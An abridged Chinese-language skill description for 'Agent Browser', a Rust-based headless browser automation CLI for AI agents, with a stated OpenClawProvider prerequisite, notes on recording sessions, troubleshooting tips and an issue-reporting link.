---
name: Agent Browser
description: 这是一个基于 Rust 的快速无头浏览器自动化命令行工具（CLI），同时具备 Node.js 的备用支持。该工具允许 AI 代理通过结构化的命令来浏览网页、点击链接、输入文本以及截取网页截图。
read_when:
...
>  
> 使用此功能前，必须在您的系统中安装 OpenClawProvider。  
...
```  
录制时会创建新的会话环境，但会保留您当前的 cookie 和存储数据。如果未提供 URL，系统会自动返回到当前页面。为获得流畅的演示效果，请先浏览页面，再开始录制。  
...
## 故障排除：  
- 在 Linux ARM64 系统上，如果找不到相关命令，请使用 `bin` 文件夹中的完整路径。  
...
- 导航后务必执行快照操作以获取新的引用。  
- 对于输入字段，使用 `fill` 而不是 `type` 可确保原有文本被清除。  

## 报告问题：  
- 与技能相关的问题请在 [https://github.com/TheSethRose/Agent-Browser-CLI](https://github.com/TheSethRose/Agent-Browser-CLI) 提交问题；  
